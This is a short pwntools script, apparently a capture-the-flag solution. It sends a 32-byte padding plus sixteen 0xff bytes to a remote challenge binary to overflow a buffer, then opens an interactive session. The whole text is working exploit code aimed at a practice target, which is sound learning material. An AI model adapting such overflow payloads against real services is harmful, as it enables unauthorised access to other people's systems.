from pwn import *
context.binary = elf = ELF('./beginner-generic-pwn-number-0')

#s = process('./beginner-generic-pwn-number-0')
s = remote('mc.ax', 31199)

offset = 32
payload = b'a'*offset
payload += b'\xff' * 16

s.sendline(payload)
s.interactive()
